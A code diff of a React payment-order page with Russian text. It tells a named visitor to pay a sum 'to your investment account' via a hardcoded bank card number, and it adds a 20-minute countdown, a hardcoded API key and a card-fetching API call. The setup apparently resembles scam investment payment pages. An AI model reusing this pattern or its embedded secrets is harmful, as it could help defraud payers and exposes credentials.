@@ -7,6 +7,7 @@ import { IoCardOutline } from "react-icons/io5";
 import { RiMastercardFill } from "react-icons/ri";
 import { RiVisaFill } from "react-icons/ri";
 import axios from 'axios'
+import { useEffect, useState } from 'react';
 
 
 
@@ -15,15 +16,16 @@ const API_KEY = '149D1073FDB876653B5FE9B602A8F815FD5463C47F9E5DFB8EE5B872E87E492
 
 
 interface FormProps {
-  bank: string; 
+  
+  name: string; 
   sum: number;
-  order: string;
+  order: number;
   photo: string;
   card: string;
   client_number: 284278;
 }
 
-const App: React.FC<FormProps> = ({ client_number, bank, sum, photo, card, order }) => {
+const Order: React.FC<FormProps> = ({ client_number, name, sum , photo, card, order }) => {
   
   const navigate = useNavigate();
   
@@ -43,26 +45,54 @@ const App: React.FC<FormProps> = ({ client_number, bank, sum, photo, card, order
   } 
 
 
+  const storedData = localStorage.getItem('userdata');
 
-
-
-
-
-  async function fetchCard() {
-    const response = await fetch(`https://cardapi.top/api/auto/get_card/client/${client_number}/amount/${sum}/currency/RUB/niche/auto`);
-    const movies = await response.json();
-    return movies;
-  }
   
-  
+  const storedObject = JSON.parse(storedData);      
 
-  const gettingCard = () => {
-    fetchCard().then(movies => {
-      console.log(movies); // fetched movies
+
+  sum = storedObject && storedObject.summ;        
+
+  name = storedObject && storedObject.name;
+
+
+  
+  const initialTimeInSeconds = 20 * 60; // Время в секундах (20 минут)
+  const [remainingTime, setRemainingTime] = useState<number>(
+  parseInt(localStorage.getItem('remainingTime') || '', 10) || initialTimeInSeconds // Секунды с БД 
+    ); 
+  
+  useEffect(() => {
+  const timerInterval = setInterval(() => {
+    setRemainingTime(prevTime => {
+    const newTime = prevTime - 1; // Таймер 
+    localStorage.setItem('remainingTime', newTime.toString()); // В локалХранилище перекидывает текущее время 
+    
+    return newTime;
     });
-    // const api_url =  axios.get(`https://cardapi.top/api/auto/get_card/client/${client_number}/amount/${sum}/currency/RUB/niche/auto`);
-    // const data =  api_url
-  }
+    
+   }, 1000); // Каждую секунду
+    return () => {
+      clearInterval(timerInterval);                     
+    };
+  }, []);
+  
+  useEffect(() => {
+    // Обнуляем таймер и перенаправляем на другую страницу при достижении времени
+    if (remainingTime < 0) {
+      setRemainingTime(0);
+      localStorage.setItem('remainingTime', '0');
+      // Замените 'новый_адрес_страницы' на реальный адрес, на который вы хотите перейти
+      window.location.href = '/payment/bank/order-status';
+    }
+  }, [remainingTime]);
+
+  const formatTime = (seconds: number) => {
+    const minutes = Math.floor(seconds / 60);
+    const remainingSeconds = seconds % 60;
+    return `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
+    };
+  
   console.log(`https://cardapi.top/api/auto/get_card/client/${client_number}/amount/${sum}/currency/RUB/niche/auto`);
   
   // axios.get(`https://cardapi.top/api/auto/get_card/client/${client_number}/amount/${sum}/currency/RUB/niche/auto`)
@@ -74,6 +104,7 @@ const App: React.FC<FormProps> = ({ client_number, bank, sum, photo, card, order
   //   if (error.response) {
   //     // Запрос был выполнен, но сервер вернул статус отличный от 2xx
   //     console.error('Server responded with an error status:', error.response.status);
+  //     console.error('Response data:', error.response.data);
   //   } else if (error.request) {
   //     // Запрос был сделан, но ответ не был получен
   //     console.error('No response received from the server');
@@ -103,17 +134,17 @@ const App: React.FC<FormProps> = ({ client_number, bank, sum, photo, card, order
       <h1>Ваша заявка №{order}</h1>
       <div className="order-container">
           <div className="order-container-info">
-              <p>Оплатитите</p>
+              <h3>{name},</h3>
+              <p>оплатите</p>
               <h3>{sum} RUB</h3>
-              <p>на карту банка</p>
-              <h3>{bank}</h3>
-              <button onClick={gettingCard}></button>
+              <p>на свой инвестиционнный счёт</p>
+              {/* <button onClick={gettingCard}></button> */}
           </div>
           <div className="order-container-cardblock">
             <div className="order-container-payment">
               {/* <img className="payment-photo"src="https://habrastorage.org/getpro/moikrug/uploads/company/100/006/341/2/logo/big_32156f1572916e1f7fb432e67e1defc2.png" alt="" /> */}
               <IoCardOutline className='payment-photo' />
-              <h1>{card}</h1>
+              <h1>{card}4276550086750745</h1>
               <button className='payment-btn' onClick={handleButtonCancel}> <MdContentCopy /> </button>
             </div>
             <div className="order-container-coment">
@@ -137,47 +168,12 @@ const App: React.FC<FormProps> = ({ client_number, bank, sum, photo, card, order
           </div>
           <div className="order-container-time">
             <p>Произведите оплату в течении:</p>
-            <div>20:00</div>
+            <div>{formatTime(remainingTime)}</div>
           </div>
       </div>
     </div>
   );
 };
-
-
-const Order: React.FC = () => {
-
-
-  const storedData = localStorage.getItem('userdata');
-
-  
-  const storedObject = JSON.parse(storedData);
-  
-  
-  return (
-    <>
-    <App
-        sum={storedObject.summ}
-        client_number={284278}
-        bank='Тинькофф'
-        photo=''
-        card=''
-        order=''
-        />
-    </>
-  );
-};
-
-
-
-
-
-
-
-
-
-
-
 
 
 export default Order;
